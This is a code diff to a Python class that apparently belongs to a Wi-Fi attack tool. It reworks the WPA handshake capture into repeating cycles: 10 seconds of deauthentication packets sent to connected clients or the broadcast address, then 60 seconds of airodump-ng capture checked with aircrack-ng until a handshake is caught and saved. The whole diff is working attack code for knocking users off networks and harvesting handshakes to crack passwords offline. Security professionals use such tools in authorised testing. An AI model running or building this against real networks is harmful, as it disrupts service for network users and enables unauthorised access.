@@ -442,53 +442,48 @@ class HandshakeCapture:
             except Exception as e:
                 self.console.print(f"[yellow]Error sending deauth packet: {str(e)}[/yellow]")
 
-    def capture_handshakes(self):
-        """Start airodump-ng to capture handshakes"""
-        try:
-            # Start airodump-ng for handshake capture
-            self.capture_file = get_capture_path(f'handshake_{self.target_bssid.replace(":", "")}')
-            capture_cmd = [
-                'airodump-ng',
-                '--bssid', self.target_bssid,
-                '--channel', self.target_channel,
-                '--write', self.capture_file,
-                '--output-format', 'pcap',
-                self.interface
-            ]
+    def send_deauth_cycle(self, clients):
+        """Send deauth packets for a 10-second cycle"""
+        end_time = time.time() + 10  # 10 seconds of deauth
+
+        with Progress() as progress:
+            task = progress.add_task("[red]Sending deauth packets...", total=10)
             
-            with Progress() as progress:
-                task = progress.add_task("[cyan]Listening for handshakes...", total=None)
-                
-                process = subprocess.Popen(
-                    capture_cmd,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL
-                )
-                
-                try:
-                    while self.running:
-                        # Check if handshake was captured
-                        if os.path.exists(f"{self.capture_file}-01.cap"):
-                            result = subprocess.run(
-                                ['aircrack-ng', f"{self.capture_file}-01.cap"],
-                                capture_output=True,
-                                text=True
-                            )
-                            
-                            if "1 handshake" in result.stdout:
-                                self.handshake_captured = True
-                                self.running = False
-                                self.console.print("\n[green]✓ WPA handshake successfully captured![/green]")
-                                break
-                        
-                        progress.update(task)
-                        time.sleep(1)
-                        
-                finally:
-                    process.terminate()
+            while time.time() < end_time and self.running and not self.handshake_captured:
+                if clients:
+                    for client in clients:
+                        self.send_deauth(client)
+                else:
+                    self.send_deauth("FF:FF:FF:FF:FF:FF")
                     
-        except Exception as e:
-            self.console.print(f"[red]Error during handshake capture: {str(e)}[/red]")
+                progress.update(task, advance=1)
+                time.sleep(1)
+
+    def listen_cycle(self):
+        """Listen for handshakes for 1 minute"""
+        end_time = time.time() + 60  # 1 minute of listening
+
+        with Progress() as progress:
+            task = progress.add_task("[cyan]Listening for handshakes...", total=60)
+            
+            while time.time() < end_time and self.running and not self.handshake_captured:
+                # Check for handshake
+                if os.path.exists(f"{self.capture_file}-01.cap"):
+                    result = subprocess.run(
+                        ['aircrack-ng', f"{self.capture_file}-01.cap"],
+                        capture_output=True,
+                        text=True
+                    )
+                    
+                    if "1 handshake" in result.stdout:
+                        self.handshake_captured = True
+                        self.console.print("\n[green]✓ WPA handshake successfully captured![/green]")
+                        return True
+                
+                progress.update(task, advance=1)
+                time.sleep(1)
+            
+            return False
 
     def start_capture(self):
         """Main handshake capture process"""
@@ -518,37 +513,47 @@ class HandshakeCapture:
 
             # Start capture process
             self.running = True
+            self.capture_file = get_capture_path(f'handshake_{self.target_bssid.replace(":", "")}')
+
+            # Start airodump-ng in background
+            capture_cmd = [
+                'airodump-ng',
+                '--bssid', self.target_bssid,
+                '--channel', self.target_channel,
+                '--write', self.capture_file,
+                '--output-format', 'pcap',
+                self.interface
+            ]
             
-            # Start handshake capture in a separate thread
-            capture_thread = threading.Thread(target=self.capture_handshakes)
-            capture_thread.daemon = True
-            capture_thread.start()
+            capture_process = subprocess.Popen(
+                capture_cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
 
             # Wait for airodump to start
             time.sleep(2)
 
-            # Perform deauth attacks
-            if clients:
-                self.console.print("\n[yellow]Deauthenticating connected clients...[/yellow]")
-                with Progress() as progress:
-                    task = progress.add_task("[cyan]Sending deauth packets...", total=len(clients))
-                    
-                    for client in clients:
-                        self.send_deauth(client)
-                        progress.update(task, advance=1)
-            else:
-                # If no clients found, try broadcast deauth
-                self.console.print("\n[yellow]No clients connected. Sending broadcast deauth...[/yellow]")
-                self.send_deauth("FF:FF:FF:FF:FF:FF")
-
-            self.console.print("\n[cyan]Listening for WPA handshake...[/cyan]")
-            self.console.print("[yellow]Press Ctrl+C to stop capture[/yellow]")
-
+            cycle_count = 1
             try:
-                while self.running:
-                    time.sleep(1)
+                while self.running and not self.handshake_captured:
+                    self.console.print(f"\n[cyan]Starting cycle {cycle_count}[/cyan]")
+                    
+                    # Deauth phase
+                    self.send_deauth_cycle(clients)
+                    
+                    if self.handshake_captured:
+                        break
+                    
+                    # Listening phase
+                    if self.listen_cycle():
+                        break
+                    
+                    cycle_count += 1
+
             except KeyboardInterrupt:
                 self.running = False
+                self.console.print("\n[yellow]Capture stopped by user[/yellow]")
 
             # Save results
             if self.handshake_captured:
@@ -560,8 +565,11 @@ class HandshakeCapture:
                     shutil.move(final_path, save_path)
                     self.console.print(f"\n[green]Handshake saved to: {save_path}[/green]")
                     log_activity(f"Handshake captured - Target: {self.target_essid or self.target_bssid}")
+            else:
+                self.console.print("\n[yellow]No handshake captured[/yellow]")
 
             # Cleanup
+            capture_process.terminate()
             cleanup_temp_files()
 
         except Exception as e:
